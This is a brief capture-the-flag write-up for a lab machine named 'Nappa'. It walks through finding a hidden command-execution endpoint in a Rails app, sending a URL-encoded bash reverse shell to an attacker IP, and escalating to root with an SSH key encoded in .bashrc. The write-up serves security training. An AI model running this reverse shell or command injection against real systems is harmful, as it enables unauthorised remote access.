# Nappa

### Enumeration

```
8080/tcp  open     http-proxy
```

Registered with test@test.com:password

404 Error Page -> Routing Error Page

```
system_path 	        GET 	/serverinfo(.:format) 	serverinfo#index
system_cmd_path 	POST 	/serverinfo(.:format) 	serverinfo#cmd
```

```
http://192.168.95.114:8080/serverinfo

In source code, there is a comment area

  <!-- 
  <input type="text" name="cmd" readonly="">
  <input type="submit" >
  -->
```

With Burp Suite, we can make it workable.

GET /serverinfo -> Do intercept -> Response to this request

### Initial Access

Click submit -> Find the post request in history -> Send to the repeater -> Add, url encoded cmd

```
cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%39%2e%39%35%2f%38%30%20%30%3e%26%31

#Decoded
cmd=/bin/bash -i >& /dev/tcp/192.168.49.95/80 0>&1
```

### PrivEsc

```
kathleen@nappa ~]$ cat .bashrc
# alias FUWS2LJNIJCUOSKOEBH...[REDACTED]
```

This is a base32 encoded string. It is an openssh private key. Save contents of it to a file.

```
$ chmod 600 privkey
$ ssh -i privkey root@192.168.95.114 -p 60022
```
